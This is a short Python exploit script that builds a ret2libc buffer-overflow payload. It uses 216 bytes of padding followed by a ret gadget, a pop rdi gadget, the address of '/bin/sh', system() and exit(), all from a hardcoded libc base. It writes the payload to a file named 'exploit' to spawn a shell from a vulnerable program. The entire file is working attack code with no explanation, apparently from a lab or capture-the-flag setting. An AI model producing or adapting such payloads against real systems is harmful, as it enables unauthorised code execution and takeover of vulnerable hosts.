import sys 
import struct

libc_base_address = 0x00007ffff7d82000
ret = libc_base_address +  0x0000000000029cd6
pop_rdi = libc_base_address + 0x000000000002a3e5
bin_sh = libc_base_address + 0x1d8698
system_function = libc_base_address + 0x0000000000050d60
exit_function = libc_base_address + 0x00000000000455f0


buf = b"A" * 216
buf += struct.pack('<Q', ret)
buf += struct.pack('<Q', pop_rdi) # pop rdi ; ret
buf += struct.pack('<Q', bin_sh) #/bin/sh
buf += struct.pack('<Q', system_function) # system()
buf += struct.pack('<Q', exit_function) # exit()

fd = open("exploit", "wb")
fd.write(buf)
